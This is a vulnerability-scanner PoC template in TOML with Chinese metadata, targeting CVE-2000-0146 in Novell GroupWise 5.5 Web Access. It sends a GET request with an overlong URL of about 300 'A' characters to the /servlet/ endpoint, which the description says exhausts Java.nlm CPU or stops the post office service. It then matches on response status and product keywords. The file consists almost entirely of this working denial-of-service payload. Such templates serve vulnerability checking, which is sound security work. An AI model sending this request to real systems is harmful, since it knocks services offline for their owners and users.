[info]
author = "AVE"
description = "通过向 Novell GroupWise 5.5 Enhancement Pack Web Access 的 /servlet/ 端点发送超长 URL（200+ 字符），可触发 Java.nlm 进程 CPU 耗尽或 post office 服务停止，导致拒绝服务。本 PoC 发送长 URL 请求验证目标是否存在该漏洞。"
id = "POC-AVE-2000-0131"
name = "Novell GroupWise 5.5 Web Access Java Servlet 拒绝服务漏洞 PoC"
severity = "medium"
tags = [
    "cve-2000-0146",
    "dos",
    "novell",
    "groupwise",
]
vuln_id = [
    "CVE-2000-0146",
    "AVE-2000-0131",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/servlet/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [
    200,
    500,
    503,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Java",
    "Servlet",
    "GroupWise",
    "Novell",
]
